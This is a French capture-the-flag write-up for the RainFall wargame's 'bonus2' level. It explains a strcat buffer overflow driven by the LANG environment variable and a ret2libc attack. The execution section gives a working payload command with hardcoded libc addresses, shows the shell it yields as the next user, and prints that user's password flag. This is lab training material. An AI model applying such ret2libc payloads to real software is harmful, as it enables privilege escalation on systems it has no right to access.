#### Etape 1 : Décompilation

Le bianire appelle la variable d'environnement LANG et print en fonction de celle-ci une string associé.
Avant de print cette variable le binaire effectue un strcat de la string avec une autre variable globale qui pointe sur une adresse de la stack.

#### Etape 2 : Informations

Lors du strcat le buffer destinataire fait 40 octets.
Si l'on copie 40 caractères et ainsi on ne met plus de '\0' à la fin, la string contiendra les caractères du 2e argument du programme.

#### Etape 3 : Objectif

L'objectif sera donc d'écrire dans le premier argument 40 caractères puis dans le second de faire en sorte d'éxécuter un shell.
Après avoir tenter d'ajouter un shellcode sans succès nous avons tentés de reproduire un ret2libc.
Celui ci nécessite d'appeler le pointeur de la fonction system, d'y ajouter ensuite un pointeur vers une fonction, c'est necessaire pour spécifier dans quel fonction retourner après l'appel a system. Pour finir ajouter une adresse qui correspond a la chaine de caractères que l'on souhaite éxécuter.

#### Etape 4 : Execution 

```bash
bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7" + "\x8a\x84\x04\x08" + "\x58\xcc\xf8\xb7"'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�淊X��
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```